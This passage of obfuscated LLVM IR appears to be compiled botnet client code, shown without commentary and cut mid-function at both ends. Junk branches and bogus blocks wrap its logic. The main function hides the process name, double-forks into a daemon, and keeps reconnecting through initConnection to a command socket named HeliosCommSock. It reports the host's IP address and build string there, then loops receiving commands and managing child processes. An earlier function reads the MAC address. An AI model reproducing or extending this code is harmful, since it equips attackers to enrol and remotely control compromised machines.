  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %172 = call i8* @strcpy(i8* %170, i8* %171) #2
  %173 = load i32, i32* %2, align 4
  %174 = call i32 (i32, i64, ...) @ioctl(i32 %173, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %175

; <label>:175:                                    ; preds = %originalBBpart232, %167
  %176 = load i32, i32* %10, align 4
  %177 = icmp slt i32 %176, 6
  br i1 %177, label %178, label %225

; <label>:178:                                    ; preds = %175
  %179 = load i32, i32* @x.93
  %180 = load i32, i32* @y.94
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %178
  %187 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %188 = bitcast %union.anon.6* %187 to %struct.sockaddr*
  %189 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %188, i32 0, i32 1
  %190 = getelementptr inbounds [14 x i8], [14 x i8]* %189, i32 0, i32 0
  %191 = load i32, i32* %10, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i8, i8* %190, i64 %192
  %194 = load i8, i8* %193, align 1
  %195 = load i32, i32* %10, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %196
  store i8 %194, i8* %197, align 1
  %198 = load i32, i32* @x.93
  %199 = load i32, i32* @y.94
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %206

; <label>:206:                                    ; preds = %originalBBpart224
  %207 = load i32, i32* @x.93
  %208 = load i32, i32* @y.94
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %206
  %215 = load i32, i32* %10, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %10, align 4
  %217 = load i32, i32* @x.93
  %218 = load i32, i32* @y.94
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart232, label %originalBB26alteredBB

originalBBpart232:                                ; preds = %originalBB26
  br label %175

; <label>:225:                                    ; preds = %175
  br label %226

; <label>:226:                                    ; preds = %225, %originalBBpart220
  %227 = load i32, i32* %2, align 4
  %228 = call i32 @close(i32 %227)
  br label %229

; <label>:229:                                    ; preds = %226, %84, %61, %originalBBpart2
  %230 = load i32, i32* %1, align 4
  ret i32 %230

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %231 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %231, i8 0, i64 16, i32 4, i1 false)
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %232, align 4
  %233 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0)) #2
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %235 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %234, i32 0, i32 0
  store i32 %233, i32* %235, align 4
  %236 = call zeroext i16 @htons(i16 zeroext 53) #13
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %236, i16* %237, align 2
  %238 = load i32, i32* %2, align 4
  %239 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %240 = call i32 @connect(i32 %238, %struct.sockaddr* %239, i32 16)
  store i32 %240, i32* %4, align 4
  %241 = load i32, i32* %4, align 4
  %242 = icmp eq i32 %241, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 16, i32* %6, align 4
  %243 = load i32, i32* %2, align 4
  %244 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %245 = call i32 @getsockname(i32 %243, %struct.sockaddr* %244, i32* %6) #2
  store i32 %245, i32* %4, align 4
  %246 = load i32, i32* %4, align 4
  %247 = icmp eq i32 %246, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %249 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %248, i32 0, i32 0
  %250 = load i32, i32* %249, align 4
  store i32 %250, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %251 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.406, i32 0, i32 0), i32 0)
  store i32 %251, i32* %7, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  %252 = load i8*, i8** %9, align 8
  store i8 0, i8* %252, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %145
  %253 = load i32, i32* %7, align 4
  %254 = call i32 @close(i32 %253)
  %255 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %256 = load i8, i8* %255, align 16
  %257 = icmp ne i8 %256, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %178
  %258 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %259 = bitcast %union.anon.6* %258 to %struct.sockaddr*
  %260 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %259, i32 0, i32 1
  %261 = getelementptr inbounds [14 x i8], [14 x i8]* %260, i32 0, i32 0
  %262 = load i32, i32* %10, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds i8, i8* %261, i64 %263
  %265 = load i8, i8* %264, align 1
  %266 = load i32, i32* %10, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %267
  store i8 %265, i8* %268, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %206
  %269 = load i32, i32* %10, align 4
  %_ = shl i32 %269, 1
  %_27 = shl i32 %269, 1
  %_28 = sub i32 0, %269
  %gen = add i32 %_28, 1
  %_29 = sub i32 %269, 1
  %gen30 = mul i32 %_29, 1
  %270 = add nsw i32 %269, 1
  store i32 %270, i32* %10, align 4
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.410, i32 0, i32 0), i8** %12, align 8
  %53 = load i8*, i8** %12, align 8
  %54 = call %struct._IO_FILE* @fopen(i8* %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %54, %struct._IO_FILE** %13, align 8
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %56 = icmp eq %struct._IO_FILE* %55, null
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %2
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.412, i32 0, i32 0), i8** %12, align 8
  %58 = load i8*, i8** %12, align 8
  %59 = call %struct._IO_FILE* @fopen(i8* %58, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %59, %struct._IO_FILE** %13, align 8
  br label %60

; <label>:60:                                     ; preds = %57, %2
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %62 = icmp ne %struct._IO_FILE* %61, null
  br i1 %62, label %63, label %172

; <label>:63:                                     ; preds = %60
  %64 = load i8**, i8*** %5, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %69 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %70 = call i8* @getcwd(i8* %69, i64 256) #2
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #10
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %168

; <label>:74:                                     ; preds = %63
  br label %75

; <label>:75:                                     ; preds = %originalBBpart2, %74
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* %16, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp ne i32 %83, 47
  br i1 %84, label %85, label %104

; <label>:85:                                     ; preds = %75
  %86 = load i32, i32* @x.97
  %87 = load i32, i32* @y.98
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %85
  %94 = load i32, i32* %16, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %16, align 4
  %96 = load i32, i32* @x.97
  %97 = load i32, i32* @y.98
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:104:                                    ; preds = %75
  %105 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = load i32, i32* %16, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = call i32 (i8*, i8*, ...) @sprintf(i8* %105, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* %106, i8* %112) #2
  br label %114

; <label>:114:                                    ; preds = %130, %104
  %115 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %116 = call i32 @feof(%struct._IO_FILE* %115) #2
  %117 = icmp ne i32 %116, 0
  %118 = xor i1 %117, true
  br i1 %118, label %119, label %131

; <label>:119:                                    ; preds = %114
  %120 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %121 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %122 = call i8* @fgets(i8* %120, i32 1024, %struct._IO_FILE* %121)
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %124 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %125 = call i32 @strcasecmp(i8* %123, i8* %124) #10
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %130, label %127

; <label>:127:                                    ; preds = %119
  %128 = load i32, i32* %17, align 4
  %129 = add nsw i32 %128, 1
  store i32 %129, i32* %17, align 4
  br label %130

; <label>:130:                                    ; preds = %127, %119
  br label %114

; <label>:131:                                    ; preds = %114
  %132 = load i32, i32* @x.97
  %133 = load i32, i32* @y.98
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %131
  %140 = load i32, i32* %17, align 4
  %141 = icmp eq i32 %140, 0
  %142 = load i32, i32* @x.97
  %143 = load i32, i32* @y.98
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br i1 %141, label %150, label %164

; <label>:150:                                    ; preds = %originalBBpart211
  %151 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %152 = call i32 @fclose(%struct._IO_FILE* %151)
  %153 = load i8*, i8** %12, align 8
  %154 = call %struct._IO_FILE* @fopen(i8* %153, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.415, i32 0, i32 0))
  store %struct._IO_FILE* %154, %struct._IO_FILE** %18, align 8
  %155 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %156 = icmp ne %struct._IO_FILE* %155, null
  br i1 %156, label %157, label %163

; <label>:157:                                    ; preds = %150
  %158 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %159 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %160 = call i32 @fputs(i8* %158, %struct._IO_FILE* %159)
  %161 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %162 = call i32 @fclose(%struct._IO_FILE* %161)
  br label %163

; <label>:163:                                    ; preds = %157, %150
  br label %167

; <label>:164:                                    ; preds = %originalBBpart211
  %165 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %166 = call i32 @fclose(%struct._IO_FILE* %165)
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br label %171

; <label>:168:                                    ; preds = %63
  %169 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %170 = call i32 @fclose(%struct._IO_FILE* %169)
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br label %172

; <label>:172:                                    ; preds = %171, %60
  %173 = call i32 @getOurIP()
  %174 = call i32 @fork() #2
  store i32 %174, i32* %7, align 4
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %179

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* %7, align 4
  %178 = call i32 @waitpid(i32 %177, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:179:                                    ; preds = %172
  %180 = load i32, i32* %7, align 4
  %181 = icmp ne i32 %180, 0
  br i1 %181, label %242, label %182

; <label>:182:                                    ; preds = %179
  %183 = load i32, i32* @x.97
  %184 = load i32, i32* @y.98
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %182
  %191 = call i32 @fork() #2
  store i32 %191, i32* %8, align 4
  %192 = icmp ne i32 %191, 0
  %193 = load i32, i32* @x.97
  %194 = load i32, i32* @y.98
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %192, label %201, label %218

; <label>:201:                                    ; preds = %originalBBpart215
  %202 = load i32, i32* @x.97
  %203 = load i32, i32* @y.98
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %201
  call void @exit(i32 0) #14
  %210 = load i32, i32* @x.97
  %211 = load i32, i32* @y.98
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  unreachable

; <label>:218:                                    ; preds = %originalBBpart215
  %219 = load i32, i32* %8, align 4
  %220 = icmp ne i32 %219, 0
  br i1 %220, label %222, label %221

; <label>:221:                                    ; preds = %218
  br label %240

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.97
  %224 = load i32, i32* @y.98
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %222
  %231 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  %232 = load i32, i32* @x.97
  %233 = load i32, i32* @y.98
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %240

; <label>:240:                                    ; preds = %originalBBpart223, %221
  br label %241

; <label>:241:                                    ; preds = %240
  br label %260

; <label>:242:                                    ; preds = %179
  %243 = load i32, i32* @x.97
  %244 = load i32, i32* @y.98
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %242
  %251 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  %252 = load i32, i32* @x.97
  %253 = load i32, i32* @y.98
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %260

; <label>:260:                                    ; preds = %originalBBpart227, %241
  br label %261

; <label>:261:                                    ; preds = %260
  %262 = call i32 @setsid() #2
  %263 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #2
  %264 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %265

; <label>:265:                                    ; preds = %853, %268, %261
  %266 = call i32 @initConnection()
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %270

; <label>:268:                                    ; preds = %265
  %269 = call i32 @sleep(i32 30)
  br label %265

; <label>:270:                                    ; preds = %265
  %271 = load i32, i32* @HeliosCommSock, align 4
  %272 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %273 = call i8* @inet_ntoa(i32 %272) #2
  %274 = call i8* @getBuild()
  %275 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %271, i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.417, i32 0, i32 0), i8* %273, i8* %274)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %276

; <label>:276:                                    ; preds = %852, %678, %536, %445, %270
  %277 = load i32, i32* @HeliosCommSock, align 4
  %278 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %279 = call i32 @recvLine(i32 %277, i8* %278, i32 4096)
  store i32 %279, i32* %20, align 4
  %280 = icmp ne i32 %279, -1
  br i1 %280, label %281, label %853

; <label>:281:                                    ; preds = %276
  store i32 0, i32* %21, align 4
  br label %282

; <label>:282:                                    ; preds = %433, %281
  %283 = load i32, i32* @x.97
  %284 = load i32, i32* @y.98
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %282
  %291 = load i32, i32* %21, align 4
  %292 = sext i32 %291 to i64
  %293 = load i64, i64* @numpids, align 8
  %294 = icmp ult i64 %292, %293
  %295 = load i32, i32* @x.97
  %296 = load i32, i32* @y.98
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %294, label %303, label %436

; <label>:303:                                    ; preds = %originalBBpart231
  %304 = load i32*, i32** @pids, align 8
  %305 = load i32, i32* %21, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i32, i32* %304, i64 %306
  %308 = load i32, i32* %307, align 4
  %309 = call i32 @waitpid(i32 %308, i32* null, i32 1)
  %310 = icmp sgt i32 %309, 0
  br i1 %310, label %311, label %432

; <label>:311:                                    ; preds = %303
  %312 = load i32, i32* %21, align 4
  %313 = add nsw i32 %312, 1
  store i32 %313, i32* %23, align 4
  br label %314

; <label>:314:                                    ; preds = %346, %311
  %315 = load i32, i32* @x.97
  %316 = load i32, i32* @y.98
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %314
  %323 = load i32, i32* %23, align 4
  %324 = zext i32 %323 to i64
  %325 = load i64, i64* @numpids, align 8
  %326 = icmp ult i64 %324, %325
  %327 = load i32, i32* @x.97
  %328 = load i32, i32* @y.98
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %326, label %335, label %349

; <label>:335:                                    ; preds = %originalBBpart235
  %336 = load i32*, i32** @pids, align 8
  %337 = load i32, i32* %23, align 4
  %338 = zext i32 %337 to i64
  %339 = getelementptr inbounds i32, i32* %336, i64 %338
  %340 = load i32, i32* %339, align 4
  %341 = load i32*, i32** @pids, align 8
  %342 = load i32, i32* %23, align 4
  %343 = sub i32 %342, 1
  %344 = zext i32 %343 to i64
  %345 = getelementptr inbounds i32, i32* %341, i64 %344
  store i32 %340, i32* %345, align 4
  br label %346

; <label>:346:                                    ; preds = %335
  %347 = load i32, i32* %23, align 4
  %348 = add i32 %347, 1
  store i32 %348, i32* %23, align 4
  br label %314

; <label>:349:                                    ; preds = %originalBBpart235
  %350 = load i32, i32* @x.97
  %351 = load i32, i32* @y.98
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %349
  %358 = load i32*, i32** @pids, align 8
  %359 = load i32, i32* %23, align 4
  %360 = sub i32 %359, 1
  %361 = zext i32 %360 to i64
  %362 = getelementptr inbounds i32, i32* %358, i64 %361
  store i32 0, i32* %362, align 4
  %363 = load i64, i64* @numpids, align 8
  %364 = add i64 %363, -1
  store i64 %364, i64* @numpids, align 8
  %365 = load i64, i64* @numpids, align 8
  %366 = add i64 %365, 1
  %367 = mul i64 %366, 4
  %368 = call noalias i8* @malloc(i64 %367) #2
  %369 = bitcast i8* %368 to i32*
  store i32* %369, i32** %22, align 8
  store i32 0, i32* %23, align 4
  %370 = load i32, i32* @x.97
  %371 = load i32, i32* @y.98
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart281, label %originalBB37alteredBB

originalBBpart281:                                ; preds = %originalBB37
  br label %378

; <label>:378:                                    ; preds = %originalBBpart296, %originalBBpart281
  %379 = load i32, i32* @x.97
  %380 = load i32, i32* @y.98
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %378
  %387 = load i32, i32* %23, align 4
  %388 = zext i32 %387 to i64
  %389 = load i64, i64* @numpids, align 8
  %390 = icmp ult i64 %388, %389
  %391 = load i32, i32* @x.97
  %392 = load i32, i32* @y.98
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %390, label %399, label %428

; <label>:399:                                    ; preds = %originalBBpart285
  %400 = load i32*, i32** @pids, align 8
  %401 = load i32, i32* %23, align 4
  %402 = zext i32 %401 to i64
  %403 = getelementptr inbounds i32, i32* %400, i64 %402
  %404 = load i32, i32* %403, align 4
  %405 = load i32*, i32** %22, align 8
  %406 = load i32, i32* %23, align 4
  %407 = zext i32 %406 to i64
